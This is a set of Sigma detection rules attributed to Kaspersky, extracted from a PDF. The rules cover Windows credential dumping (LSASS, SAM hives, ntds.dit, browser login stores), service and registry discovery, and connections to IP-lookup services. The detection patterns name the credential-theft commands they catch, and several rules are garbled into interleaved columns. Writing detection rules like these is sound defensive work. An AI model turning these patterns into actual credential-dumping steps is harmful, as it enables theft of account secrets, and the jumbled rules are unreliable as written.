https://github.com/\nredcanaryco/atomic-red-team/\nblob/master/atomics/T1003.001/\nT1003.001.md#atomic-test-2--dump-lsassexe-memory-usingprocdump (https://github.com/\nredcanaryco/atomic-red-team/\nblob/master/atomics/T1003.001/\nT1003.001.md#atomic-test-2--dump-lsassexe-memory-usingprocdump)\n- https://twitter.com/bohops/\nstatus/1635288066909966338\n(https://twitter.com/bohops/\nstatus/1635288066909966338)\n- https://twitter.com/mrd0x/\nstatus/1511415432888131586\n(https://twitter.com/mrd0x/\nstatus/1511415432888131586)\nmodified: 2023-07-18\nauthor: Kaspersky\nstatus: stable\ntags:\n- attack.credential_access\n- attack.t1003.001\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection_procdump:\nImage|endswith:\n- '\\procdump.exe'\n- '\\procdump64.exe'\nCommandLine|contains: 'lsass'\nselection_dotnet:\nImage|endswith: '\\dotnet-dump.\nexe'\nCommandLine: ' collect '\nselection_dumpminitool:\nImage|endswith: '\\\ndumpminitool.exe'\ncondition: 1 of selection*\nfalsepositives:\n\n- Unknown\nlevel: high\n\n\n-----\n\ntitle: Detected Access to\nSAM,SYSTEM and SECURITY\nregistry hives\n\nid: d6229f33-856b-45ca-9876ec8674982b99\ndescription: Detects SAM,SYSTEM\nand SECURITY registry hives\naccessing\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.Credential Access\n- attack.T1003.002\n- attack.T1003.004\n- attack.T1003.005\n- attack.Discovery\n- attack.T1012\nlogsource:\nproduct: windows\ndetection:\nselection:\nEventID:\n- 4663\nObjectType: 'key'\nObjectName|contains:\n- '\\sam\\sam\\domains\\account\\\nusers'\n- '\\control\\lsa\\JD'\n- '\\control\\lsa\\GBG'\n- '\\control\\lsa\\Skew1'\n- '\\control\\lsa\\Data'\n- '\\security\\cache'\n- '\\security\\policy\\secrets'\nfilter:\nProcessName:\n- 'C:\\Windows\\system32\\\nservices.exe'\n- 'C:\\Windows\\system32\\\nlsass.exe'\ncondition: selection and not filter\nfalsepositives:\n- Unknown\nfields:\n- ProcessName\nlevel: high\n\n\ntitle: Generic-Process Dump\nvia Comsvcs.dll\n\nid: 8d39bc6e-3a49-4a6a-a6fbf4017a436b31\ndescription: Detects Process Dump\nvia Comsvcs.dll\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.credential_access\n- attack.t1003.001\nlogsource:\nproduct: windows\ncategory: process_creation\n\n\ntitle: Extracting Credentials\nfrom Files via PowerShell\n\nid: 1492da69-0c2d-4923-95b07a9a4d1ec46c\nstatus: stable\ndescription: Adversaries may\nsearch local file systems and\nremote file shares for files\ncontaining insecurely stored\ncredentials\nauthor: Kaspersky\nmodified: 2023-08-24\ntags:\n- attack.credential_access\n- attack.t1552.001\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\n\n\ndetection:\nselection1:\nImage|endswith:\n- 'rundll32.exe'\nCommandLine|contains:\n- 'comsvcs.dll,'\nselection2:\nCommandLine|contains:\n- 'MiniDump'\n- '#24'\ncondition: selection1 and\nselection2\nfalsepositives:\n- unknown\nlevel: high\n\n\nselection:\nImage|endswith:\n- '\\pwsh.exe'\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\n- '\\\nSyncAppvPublishingServer.exe'\nCommandLine|contains|all:\n- 'ls'\n- '-R'\n- 'select-string '\n- '-Pattern'\nCommandLine|contains:\n- 'password'\n- 'secret'\ncondition: selection\nfalsepositives:\n- Legitimate Administrators'/\nSecurity officers' activity\nlevel: medium\n\n\ntitle: Generic-Saving ndts.dit\nvia ntdsutil.exe\n\nid: cf64d199-dec9-4c87-99dde7cd90b51c67\ndescription: Saving ndts.dit via\nntdsutil.exe\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.credential_access\n- attack.t1003.003\n\n\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith: 'ntdsutil.exe'\nCommandLine|re:\n- '\\sntds.*?i(fm)?.*?create'\ncondition: selection\nfalsepositives:\n- unknown\nlevel: high\n\n\n-----\n\ntitle: Sigma-Generic- - 'save' title: Generic-Dumping SAM\nSoftware Discovery via - 'export' via Command Line\n\nselection3:\n\nStandard Windows Utilities\n\nCommandLine|re:\n                           - '(?i).*\\/v\\s+svcversion.*' id: 748b3581-483d-4558-870e\nid: 01a7aa60-3e84-4bb3-bee4- - '(?i).*?SOFTWARE\\\\Microsoft\\\\ d389f102b33a\nb9d076d2d46a Windows NT\\\\CurrentVersion\\\\ description: Detects saving SAM,\ndescription: Detects software Windows.*' SYSTEM, SECURITY registry hives\ndiscovery in registry via Standard - '(?i).*?SOFTWARE\\\\Microsoft\\\\ via Command Line\nWindows Utilities Windows NT\\\\CurrentVersion\\\\ author: Kaspersky\nauthor: Kaspersky Winlogon.*' status: stable\nstatus: stable - '(?i).*?\\\\SOFTWARE\\\\ modified: 2023-08-02\nmodified: 2023-07-18 Microsoft\\\\Windows\\\\ tags:\ntags: CurrentVersion\\\\Policies\\\\ - attack.credential_access\n- attack.discovery Explorer\\\\Run.*' - attack.t1003.002\n- attack.t1518 - '(?i).*?SOFTWARE\\\\ - attack.t1003.004\n- attack.t1012 (WOW6432Node\\\\)?Microsoft\\\\ - attack.t1003.005\nlogsource: Windows\\\\CurrentVersion\\\\ logsource:\nproduct: windows (Run|Runonce|RunOnceEx| product: windows\ncategory: process_creation RunServices|RunServicesOnce).*' category: process_creation\ndetection: condition: selection1 and detection:\nselection1: selection2 and selection3 selection:\nImage|endswith: falsepositives: Image|endswith: 'reg.exe'\n- '\\reg.exe' - legit activity CommandLine|contains:\nselection2: - Administrators activity - ' save '\nCommandLine|contains: level: low selection2:\n- 'query' CommandLine|contains:\n\n                                                       - 'HKLM\\SAM'\n                                                    - 'HKLM\\SYSTEM'\n                                                    - 'HKLM\\SECURITY'\ncondition: selection and\nselection2\nfalsepositives:\nttitle: Discovery Component - 'syncappvpublishingserver.exe' - unknown\nObject Model Keys via selection2: level: high\n\nCommandLine|contains:\n\nPowerShell\n\n                         - 'InprocServer32'\n                         - 'LocalServer32'\n\nid: ba363a93-e060-49d4-a1c5- selection3:\n39dd63133d05 CommandLine|contains:\ndescription: Detects COM keys - 'gwmi Win32_COMSetting'\ndiscovery via PowerShell - 'Get-WmiObject Win32_\nauthor: Kaspersky COMSetting'\nstatus: stable condition: selection1 and\nmodified: 2023-06-19 selection2 and selection3\ntags: falsepositives:\n- attack.persistence - Unknown\n- attack.privilege_escalation level: medium\n- attack.t1546.015\n- attack.execution\n- attack.t1059.001\n- attack.discovery\n- attack.t1518.001\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection1:\nImage|endswith:\n- 'pwsh.exe'\n- 'PowerShell.exe'\n- 'PowerShell_ise.exe'\n\n\n-----\n\ntitle: Generic-Suspicious\nAccess to Credentials from\nWeb Browsers\n\nid: 88e80071-ae51-48ab-ae2681db80676fe9\ndescription: Detects suspicious\naccess to credentials from Web\nBrowsers\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.Credential Access\n- attack.T1555.003\nlogsource:\nproduct: windows\ndetection:\nselection:\nEventID:\n- 4663\nTargetObject|endswith:\n- '\\logins.json'\n- '\\key4.db'\n- '\\signons.sqlite'\n- '\\key3.db'\n- '\\formhistory.sqlite'\n- '\\Login Data'\n- '\\Login Data-journal'\n- '\\Web Data'\n- '\\Web Data-journal'\n- '\\Local State'\n- '\\Local State For Account'\nfilter:\nImage|endswith:\n- '\\Microsoft\\Edge\\\nApplication\\msedge.exe'\n- '\\Google\\Chrome\\\nApplication\\chrome.exe'\n- '\\Mozilla Firefox\\firefox.exe'\n- '\\Opera\\opera.exe'\n- '\\yandex\\yandexbrowser\\\napplication\\browser.exe'\ncondition: selection and not filter\nfalsepositives:\n- browsers accessing their files,\nadd additional browsers' file paths\nfor exclusion\nlevel: high\n\n\ntitle: Generic-Copying ntds.\ndit from Volume Shadow\nCopy\n\nid: 2c90a9dc-4de2-4cfc-a3cebc6454f6ecd7\ndescription: Copying ntds.dit from\nVolume Shadow Copy\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.credential_access\n- attack.t1003.003\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith: 'cmd.exe'\nCommandLine|contains:\n- ' copy '\nselection2:\nImage|endswith: 'esentutl.exe'\nCommandLine|contains:\n- ' /y '\n\n\ntitle: System Service\nDiscovery via PowerShell\n\nid: 62883a4d-48c5-4c9b-848d86dfd5db1e96\nstatus: stable\ndescription: Adversaries may try to\nget information about registered\nservices\nauthor: Kaspersky\nmodified: 2023-08-22\ntags:\n- attack.discovery\n- attack.t1007\n- attack.t1012\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection1:\nImage|endswith:\n- '\\pwsh.exe'\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\n- '\\\nSyncAppvPublishingServer.exe'\nselection2:\nCommandLine|contains:\n\n\nselection3:\nCommandLine|contains:\n- 'ntds\\ntds.dit'\ncondition: (selection1 or\nselection2) and selection3\nfalsepositives:\n- unknown\nlevel: high\n\n\n- 'gsv'\n- 'get-service'\n- 'Get-SystemDriver'\n- 'CIM_Service'\n- 'CIM_ServiceComponent'\n- 'CIM_\nServiceServiceDependency'\n- 'Win32_Service'\n- 'win32_systemdriver'\ncondition: selection1 and\nselection2\nfalsepositives:\n- Legitimate Administrators'\nactivity\nlevel: low\n\n\n-----\n\ntitle: System Service\nDiscovery via wmic\n\nid: 815dfeca-174e-43a0-982ac7f5927493e7\ndescription: Detects System\nService Discovery via wmic\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.discovery\n- attack.t1007\n- attack.execution\n- attack.t1047\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- '\\wmic.exe'\nCommandLine|contains:\n- 'sysdriver'\n- 'service'\nfilter:\n\n\nParentImage|contains:\n- '\\ibm\\cognos\\'\n- '\\program files\\openit\\core\\\nbin\\openit_autodetectrlm.exe'\n- '\\program files\\meraki\\\nsystems manager agent'\n- '\\meraki\\pcc agent '\n- '\\program files\\1c\\1ce\\\ncomponents\\'\n- '\\program files\\bellsoft\\\nlibericajdk-'\n- '\\program files\\palo alto\nnetworks\\globalprotect\\'\n- '\\program files\\windows\ndefender advanced threat\nprotection\\mssense.exe'\ncondition: selection and not filter\nfalsepositives: unknown\nlevel: medium\n\n\ntitle: System Service\nDiscovery via Standard\nWindows Utilities\n\nid: a2eb10b5-8dac-4308-bae454a1db834a87\nstatus: stable\ndescription: Adversaries may try to\nget information about registered\nservices\nauthor: Kaspersky\nmodified: 2023-08-22\ntags:\n- attack.discovery\n- attack.t1007\n- attack.t1012\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection1:\nImage|endswith:\n- '\\sc.exe'\nselection2:\nCommandLine|contains:\n- 'query'\n- 'qc'\n- 'qdescription'\n- 'qprivs'\nselection3:\nImage|endswith:\n- '\\net.exe'\n- '\\net1.exe'\nselection4:\nCommandLine|contains:\n- 'start'\nselection5:\nImage|endswith:\n- '\\driverquery.exe'\nselection6:\nImage|endswith:\n- '\\tasklist.exe'\nselection7:\nCommandLine|contains:\n- '/svc'\ncondition: (selection1 and\nselection2) or (selection3 and\nselection4) or selection5 or\n(selection6 and selection7)\nfalsepositives:\n- Legitimate Administrators'\nactivity\nlevel: low\n\n\ntitle: System Service\nDiscovery via Registry\n\nid: 993d8024-4fa2-4c97-976cd96c8e585a22\nstatus: stable\ndescription: Adversaries may try to\nget information about registered\nservices\nauthor: Kaspersky\nmodified: 2023-08-22\ntags:\n- attack.discovery\n- attack.t1007\n- attack.t1012\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection1:\nImage|endswith:\n- '\\reg.exe'\nselection2:\nCommandLine|contains:\n- 'query'\n- 'save'\n- 'export'\nselection3:\n\n\nCommandLine|re:\n- '(?i).*?\\\\\nSYSTEM\\\\.*ControlSet.*\\\\\nServices.*'\ncondition: selection1 and\nselection2 and selection3\nfalsepositives:\n- Unknown\nlevel: low\n\n\n-----\n\ntitle: Generic-Network\nConnection to Online IP\nResolution Web Service\n(EventID 3)\n\nid: 8cfd1381-1f85-4c5d-800cc0ec659fabac\ndescription: Detects network\nconnection to online IP resolution\nweb service\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.Discovery\n- attack.T1016\nlogsource:\nproduct: windows\ndetection:\nselection1:\nCategory:\n- Network Connection\nDestinationHostname|endswith:\n- 'pvcdesigner.com (http://\npvcdesigner.com)'\n- 'ip1.dynupdate.no-ip.com\n(http://ip1.dynupdate.no-ip.com)'\n- 'clientn.mask-myip.com\n(http://clientn.mask-myip.com)'\n- 'ipservice.suning.com (http://\nipservice.suning.com)'\n- 'madmax.utyuytjn.com\n(http://madmax.utyuytjn.com)'\n- 'whois.pconline.com.cn\n(http://whois.pconline.com.cn)'\n- 'myip.ch (http://myip.ch)'\n- 'ipv4.icanhazip.com (http://\nipv4.icanhazip.com)'\n- 'advancedpcspeedup.com\n(http://advancedpcspeedup.com)'\n- 'mypcupdate.com (http://\nmypcupdate.com)'\n- 'meuip.com (http://meuip.\ncom)'\n- 'export-it.org (http://exportit.org)'\n- 'j923940.myjino.ru (http://\nj923940.myjino.ru)'\n- 'speechsvr.kuwo.cn (http://\nspeechsvr.kuwo.cn)'\n- 'api.ipinfodb.com (http://api.\nipinfodb.com)'\n- 'api.vtaoke.com (http://api.\nvtaoke.com)'\n- '3322.org (http://3322.org)'\n- 'showmyipaddress.com\n(http://showmyipaddress.com)'\n- 'curlmyip.net (http://curlmyip.\nnet)'\n- 'dyndns.org (http://dyndns.\norg)'\n\n\n- 'api.baizhu.cc (http://api.\nbaizhu.cc)'\n- 'mobilestock.etomato.com\n(http://mobilestock.etomato.com)'\n- 'lavageeks.ru (http://\nlavageeks.ru)'\n- 'lb3.pcvisit.de (http://lb3.\npcvisit.de)'\n- 'mfastkai.fastpay02.com\n(http://mfastkai.fastpay02.com)'\n- 'api.189.cn (http://api.189.cn)'\n- 'intorobot.com (http://\nintorobot.com)'\n- 'octarine.soxx.us (http://\noctarine.soxx.us)'\n- 'galaxyevol.ru (http://\ngalaxyevol.ru)'\n- 'meuip.operahouse.com.br\n(http://meuip.operahouse.com.br)'\n- 'ipaddresslocation.org\n(http://ipaddresslocation.org)'\n- 'myipaddress.com (http://\nmyipaddress.com)'\n- 'api.dns.corp.flamingo-inc.\ncom (http://api.dns.corp.flamingoinc.com)'\n- 'ip-addr.es (http://ip-addr.es)'\n- 'netikus.net (http://netikus.\nnet)'\n- 'evda-connector.appspot.\ncom (http://evda-connector.\nappspot.com)'\n- 'api.appota.com (http://api.\nappota.com)'\n- 'ipip.yy.com (http://ipip.\nyy.com)'\n- 'ip.gralindo.com (http://\nip.gralindo.com)'\n- 'api-center.coolook.org\n(http://api-center.coolook.org)'\n- 'fqrcw.com (http://fqrcw.\ncom)'\n- 'ip.bitauto.com (http://\nip.bitauto.com)'\n- 'pro.ip-api.com (http://pro.\nip-api.com)'\n- 'gserher.myjino.ru (http://\ngserher.myjino.ru)'\n- 'ad.solverlabs.com (http://\nad.solverlabs.com)'\n- 'ipapi.xyz'\n- 'meuip.eu'\n- 'ip.cip.cc (http://ip.cip.cc)'\n- 'accountcontabilidade.com.\nbr (http://accountcontabilidade.\ncom.br)'\n\n\n- 'eryaz.net (http://eryaz.net)'\n- 'myip.dnsomatic.com (http://\nmyip.dnsomatic.com)'\n- 'botanikyazilim.com.tr (http://\nbotanikyazilim.com.tr)'\n- 'j827328.myjino.ru (http://\nj827328.myjino.ru)'\n- 'cp.wjbox.ru (http://cp.wjbox.\nru)'\n- 'httpbin.org (http://httpbin.\norg)'\n- 'ip.6655.com (http://ip.6655.\ncom)'\n- 'cmyip.com (http://cmyip.\ncom)'\n- 'pixel.ijnewhb.com (http://\npixel.ijnewhb.com)'\n- 'find-ip-address.org (http://\nfind-ip-address.org)'\n- 'api.ipapi.com (http://api.\nipapi.com)'\n- 'box.hf-game.com (http://\nbox.hf-game.com)'\n- 'lavresearch.com (http://\nlavresearch.com)'\n- '7fw.de (http://7fw.de)'\n- 'ip-detect.net (http://ipdetect.net)'\n- 'cn.soeasysdk.com (http://\ncn.soeasysdk.com)'\n- 'own24.ru (http://own24.ru)'\n- 'ip.taobao.com (http://\nip.taobao.com)'\n- 'mg-control.com (http://mgcontrol.com)'\n- 'ff2008.com (http://ff2008.\ncom)'\n- 'efixpcutils.com (http://\nefixpcutils.com)'\n- 'ctc.bj.check.ie.sogou.com\n(http://ctc.bj.check.ie.sogou.com)'\n- 'ip2country.hackers.lv (http://\nip2country.hackers.lv)'\n- 'mycomputermechanics.com\n(http://mycomputermechanics.\ncom)'\n- 'wtfismyip.com (http://\nwtfismyip.com)'\n- 'ip.rtsd.ru (http://ip.rtsd.ru)'\n- 'fw.qq.com (http://fw.qq.\ncom)'\n- 'ddns.oray.com (http://ddns.\noray.com)'\n- 'api.raaga.com (http://api.\nraaga.com)'\n\n\n-----\n\ntitle: Generic-Network\nConnection to Online IP\nResolution Web Service\n(EventID 3)\n\n- 'meuip.net.br (http://meuip.\nnet.br)'\n- 'chekfast.zennolab.com\n(http://chekfast.zennolab.com)'\n- 'bluecorp.com.ar (http://\nbluecorp.com.ar)'\n- 'app.ajokki.fi (http://app.\najokki.fi)'\n- 'ppacti.com (http://ppacti.\ncom)'\n- 'm.manxwaplay.info (http://m.\nmanxwaplay.info)'\n- 'esecurepctools.com (http://\nesecurepctools.com)'\n- 'mam.netease.com (http://\nmam.netease.com)'\n- 'dtjrtj.duckdns.org (http://\ndtjrtj.duckdns.org)'\n- 'api.kidspots.ro (http://api.\nkidspots.ro)'\n- 'int.dpool.sina.com.cn (http://\nint.dpool.sina.com.cn)'\n- 'cc.entireactiv.com (http://\ncc.entireactiv.com)'\n- 'adtoppers.com (http://\nadtoppers.com)'\n- 'jeyhun.ru (http://jeyhun.ru)'\n- 'cyberfuzz.com (http://\ncyberfuzz.com)'\n- 'grandhero.tk (http://\ngrandhero.tk)'\n- 'idream94i.tk (http://\nidream94i.tk)'\n- 'baro-meter.co.kr (http://\nbaro-meter.co.kr)'\n- 'msalcedo.com (http://\nmsalcedo.com)'\n- 'apps.game.qq.com (http://\napps.game.qq.com)'\n- 'm-ceferli95.myjino.ru\n(http://m-ceferli95.myjino.ru)'\n- 'ip.42.pl (http://ip.42.pl)'\n- 'pcpurifier.com (http://\npcpurifier.com)'\n- 'dofwq44044.dx.am (http://\ndofwq44044.dx.am)'\n- 'api.dten.com (http://api.\ndten.com)'\n- 'api.x2software.net (http://\napi.x2software.net)'\n- 'ms.efla.me'\n- 'prt.sleepnova.org (http://prt.\nsleepnova.org)'\n- 'whereisip.net (http://\nwhereisip.net)'\n- 'aws.pvp.monthurs.com\n\n\n(http://aws.pvp.monthurs.com)'\n- 'cargestion.com (http://\ncargestion.com)'\n- 'kirya272.myjino.ru (http://\nkirya272.myjino.ru)'\n- 'api.solvemedia.com (http://\napi.solvemedia.com)'\n- 'caocao69710-7.appspot.\ncom (http://caocao69710-7.\nappspot.com)'\n- 'minfosol.net (http://minfosol.\nnet)'\n- 'ipua.adfurikun.jp (http://ipua.\nadfurikun.jp)'\n- 'app.getsitecontrol.com\n(http://app.getsitecontrol.com)'\n- 'geoloc.arte.tv (http://geoloc.\narte.tv)'\n- 'm.manxwaplay.net (http://m.\nmanxwaplay.net)'\n- 'myip.ru (http://myip.ru)'\n- 'bemnacabine.com.br (http://\nbemnacabine.com.br)'\n- 'getip.com (http://getip.com)'\n- 'doodooalbum.co.kr (http://\ndoodooalbum.co.kr)'\n- 'geoip.goforandroid.com\n(http://geoip.goforandroid.com)'\n- 'lg.logging.admicro.vn (http://\nlg.logging.admicro.vn)'\n- 'ipv4.test-ipv6.com (http://\nipv4.test-ipv6.com)'\n- 'app.chinahighlights.com\n(http://app.chinahighlights.com)'\n- 'ip.anysrc.net (http://\nip.anysrc.net)'\n- 'en.safe-installation.com\n(http://en.safe-installation.com)'\n- 'myip.nl (http://myip.nl)'\n- 'ip.sap1000.com (http://\nip.sap1000.com)'\n- 'ifconfig.me'\n- 'geoiptool'\n- 'ercnetsis.com (http://\nercnetsis.com)'\n- 'maclo.myjino.ru (http://\nmaclo.myjino.ru)'\n- 'line.asure.com.tw (http://line.\nasure.com.tw)'\n- 'efixpctools.com (http://\nefixpctools.com)'\n- 'api.ipaddress.com (http://\napi.ipaddress.com)'\n- 'ip168.com (http://ip168.com)'\n- 'ns2.showmypc.com (http://\nns2.showmypc.com)'\n\n\n- 'pdapi.znyshurufa.com\n(http://pdapi.znyshurufa.com)'\n- 'matrixvoid.com (http://\nmatrixvoid.com)'\n- 'trfactiv.com (http://trfactiv.\ncom)'\n- 'ip.cn (http://ip.cn)'\n- 'geo.api.viewster.com (http://\ngeo.api.viewster.com)'\n- 'ip.larogames.cz (http://\nip.larogames.cz)'\n- 'atradepoint.com (http://\natradepoint.com)'\n- 'barmash.ru (http://barmash.\nru)'\n- 'api.test-ipv6.co (http://api.\ntest-ipv6.co)'\n- 'ip-score.com (http://ipscore.com)'\n- 'driverupdaterplus.com\n(http://driverupdaterplus.com)'\n- 'checkip.dyndns.org (http://\ncheckip.dyndns.org)'\n- 'mini5-1.opera-mini.net\n(http://mini5-1.opera-mini.net)'\n- 'binnazabla.com (http://\nbinnazabla.com)'\n- 'ipneed.com (http://ipneed.\ncom)'\n- 'ip.dedikewl.fr (http://\nip.dedikewl.fr)'\n- 'apiv6.webprovider.cz (http://\napiv6.webprovider.cz)'\n- 'caocao69710-3.appspot.\ncom (http://caocao69710-3.\nappspot.com)'\n- 'blackghange.ru (http://\nblackghange.ru)'\n- 'api-ip.mtsgp.com (http://apiip.mtsgp.com)'\n- 'dawhois.com (http://\ndawhois.com)'\n- 'myav.co.uk (http://myav.\nco.uk)'\n- 'iptrackeronline.com (http://\niptrackeronline.com)'\n- 'disrup.me'\n- 'freegeoip.net (http://\nfreegeoip.net)'\n- 'flavionet.com (http://\nflavionet.com)'\n- 'clientn.free-hideip.com\n(http://clientn.free-hideip.com)'\n- 'power-equilab.com (http://\npower-equilab.com)'\n\n\n-----\n\ntitle: Generic-Network\nConnection to Online IP\nResolution Web Service\n(EventID 3)\n\n- 'checkip.amazonaws.com\n(http://checkip.amazonaws.com)'\n- 'dcs.coohua.com (http://dcs.\ncoohua.com)'\n- 'cc.globalpcworks.com\n(http://cc.globalpcworks.com)'\n- 'dipisoft.com (http://dipisoft.\ncom)'\n- 'check2.zennolab.com\n(http://check2.zennolab.com)'\n- 'cgi.nch.com.au (http://cgi.\nnch.com.au)'\n- 'ident.me'\n- 'ip.360.cn (http://ip.360.cn)'\n- 'list.adkuai8.com (http://list.\nadkuai8.com)'\n- 'domainserver.co.kr (http://\ndomainserver.co.kr)'\n- 'cp427.agava.net (http://\ncp427.agava.net)'\n- 'api.webprovider.cz (http://\napi.webprovider.cz)'\n- 'qqmyniga.cf (http://\nqqmyniga.cf)'\n- 'ipleak.net (http://ipleak.net)'\n- 'authaddr.ichano.com (http://\nauthaddr.ichano.com)'\n- 'alfactiv.com (http://alfactiv.\ncom)'\n- 'pimp-hhf.myjino.ru (http://\npimp-hhf.myjino.ru)'\n- 'lotusulalb2.ro (http://\nlotusulalb2.ro)'\n- 'miner.party'\n- 'app.jollychic.com (http://app.\njollychic.com)'\n- 'baby-gugu.com (http://\nbaby-gugu.com)'\n- 'ipfind.co (http://ipfind.co)'\n- 'mrgs.my.com (http://mrgs.\nmy.com)'\n- 'mubawab.ma (http://\nmubawab.ma)'\n- 'ipecho.net (http://ipecho.\nnet)'\n- 'fld.funshion.com (http://fld.\nfunshion.com)'\n- 'c.51fxt.com (http://c.51fxt.\ncom)'\n- 'codingforex.com (http://\ncodingforex.com)'\n- 'f0236061.xsph.ru (http://\nf0236061.xsph.ru)'\n- 'pv.sohu.com (http://pv.sohu.\ncom)'\n- 'cc.pcspeeduppro.net\n\n\n(http://cc.pcspeeduppro.net)'\n- '4secunde.automaticit.ro\n(http://4secunde.automaticit.ro)'\n- 'ru.smart-ip.net (http://\nru.smart-ip.net)'\n- 'arconsult.hu (http://\narconsult.hu)'\n- 'hididi.net (http://hididi.net)'\n- 'atsoft.it (http://atsoft.it)'\n- 'm.foultouch.com (http://m.\nfoultouch.com)'\n- 'ping1.mquadr.at (http://ping1.\nmquadr.at)'\n- 'browser.gwdang.com (http://\nbrowser.gwdang.com)'\n- 'kahuanwang.com (http://\nkahuanwang.com)'\n- 'q987356n.beget.tech'\n- 'prod.geo.gluops.com (http://\nprod.geo.gluops.com)'\n- 'ipdomainserver.kuwo.cn\n(http://ipdomainserver.kuwo.cn)'\n- 'iplocation.geo.qiyi.com\n(http://iplocation.geo.qiyi.com)'\n- 'cloud-search.linkury.com\n(http://cloud-search.linkury.com)'\n- 'formyip.com (http://formyip.\ncom)'\n- 'demositedsv.zzz.com.ua\n(http://demositedsv.zzz.com.ua)'\n- 'iwarg.ddns.net (http://iwarg.\nddns.net)'\n- 'mreg.kuwo.cn (http://mreg.\nkuwo.cn)'\n- 'm.easyrent.com.tw (http://m.\neasyrent.com.tw)'\n- 'gafernoto.tech'\n- 'g.go2s.co (http://g.go2s.co)'\n- 'country.reliancegames.com\n(http://country.reliancegames.com)'\n- 'cc.alfactiv.com (http://\ncc.alfactiv.com)'\n- 'emailarms.com (http://\nemailarms.com)'\n- 'alice.yourapp24.com (http://\nalice.yourapp24.com)'\n- 'gu.md (http://gu.md)'\n- 'api.ms.noswifi.cn (http://api.\nms.noswifi.cn)'\n- 'agentgatech.appspot.com\n(http://agentgatech.appspot.com)'\n- 'ipandlocation.appspot.com\n(http://ipandlocation.appspot.com)'\n- 'lokj.duckdns.org (http://lokj.\nduckdns.org)'\n- 'ana.gomtv.com (http://ana.\n\n\ngomtv.com)'\n- 'pcu.4bdir4.info (http://\npcu.4bdir4.info)'\n- 'c.speedtest.net (http://c.\nspeedtest.net)'\n- 'ip138.com (http://ip138.com)'\n- 'whoer.net (http://whoer.net)'\n- 'conf.ie.sogou.com (http://\nconf.ie.sogou.com)'\n- 'phelp.anyproxy.net (http://\nphelp.anyproxy.net)'\n- 'kxunion.com (http://kxunion.\ncom)'\n- 'ip.3322.net (http://ip.3322.\nnet)'\n- 'geobytes.com (http://\ngeobytes.com)'\n- 'failover.v-speed.eu'\n- 'globalsystools.com (http://\nglobalsystools.com)'\n- 'authorizationkey.pw (http://\nauthorizationkey.pw)'\n- 'ipv4.myexternalip.com\n(http://ipv4.myexternalip.com)'\n- 'bizbuild.co.kr (http://bizbuild.\nco.kr)'\n- 'clientn.platinumhideip.com\n(http://clientn.platinumhideip.com)'\n- 'ip.pavietnam.vn (http://\nip.pavietnam.vn)'\n- 'chek.zennolab.com (http://\nchek.zennolab.com)'\n- 'l2.io (http://l2.io)'\n- 'ip-api.com (http://ip-api.\ncom)'\n- 'ms.fairplayminecraft.com\n(http://ms.fairplayminecraft.com)'\n- 'priv3.shieldapps.one'\n- 'api.ipstack.com (http://api.\nipstack.com)'\n- 'haliyikamaizmir.info (http://\nhaliyikamaizmir.info)'\n- 'ip.ip-check.net (http://ip.ipcheck.net)'\n- 'checkrealip.com (http://\ncheckrealip.com)'\n- 'checkip.dyndns.com (http://\ncheckip.dyndns.com)'\n- 'checkip.spdns.de (http://\ncheckip.spdns.de)'\n- 'autopromaker.com (http://\nautopromaker.com)'\n- 'iplocator.gofrugal.com\n(http://iplocator.gofrugal.com)'\n- 'noxcleaner.com (http://\nnoxcleaner.com)'\n\n\n-----\n\ntitle: Generic-Network\nConnection to Online IP\nResolution Web Service\n(EventID 3)\n\n- 'ae.gsecondscreen.com\n(http://ae.gsecondscreen.com)'\n- 'icanhazip.com (http://\nicanhazip.com)'\n- 'api.sypexgeo.net (http://api.\nsypexgeo.net)'\n- 'msct.kirara.st (http://msct.\nkirara.st)'\n- 'geoip.co.uk (http://geoip.\nco.uk)'\n- 'geoloc.hurriyet.com.tr\n(http://geoloc.hurriyet.com.tr)'\n- 'geoplugin.net (http://\ngeoplugin.net)'\n- 'geoip.anddoes.com (http://\ngeoip.anddoes.com)'\n- 'ipligence.com (http://\nipligence.com)'\n- 'ambianceapp.com (http://\nambianceapp.com)'\n- 'ianelolski.myjino.ru (http://\nianelolski.myjino.ru)'\n- 'myip.net (http://myip.net)'\n- 'aioli.kr (http://aioli.kr)'\n- 'propsoftware.co.uk (http://\npropsoftware.co.uk)'\n- 'infobyip.com (http://infobyip.\ncom)'\n- 'checkip.org (http://checkip.\norg)'\n- 'iplocate.firstsmile.mobi'\n- 'mrlsolutions.com (http://\nmrlsolutions.com)'\n- 'extreme-ip-lookup.com\n(http://extreme-ip-lookup.com)'\n- 'la.vietid.net (http://la.vietid.\nnet)'\n- 'meuip.ohs.com.br (http://\nmeuip.ohs.com.br)'\n- 'j680382.myjino.ru (http://\nj680382.myjino.ru)'\n- 'f0254974.xsph.ru (http://\nf0254974.xsph.ru)'\n- 'analiz.webraporlama.com\n(http://analiz.webraporlama.com)'\n- 'api.media.jio.com (http://api.\nmedia.jio.com)'\n- 'api.coolguang.com (http://\napi.coolguang.com)'\n- 'info.limehd.tv (http://info.\nlimehd.tv)'\n- 'ipgeobase.ru (http://\nipgeobase.ru)'\n- 'fast22.myjino.ru (http://\nfast22.myjino.ru)'\n- 'dynupdate.no-ip.com (http://\n\n\ndynupdate.no-ip.com)'\n- 'geoinfo.intowow.com (http://\ngeoinfo.intowow.com)'\n- 'iploc.eset.com (http://iploc.\neset.com)'\n- 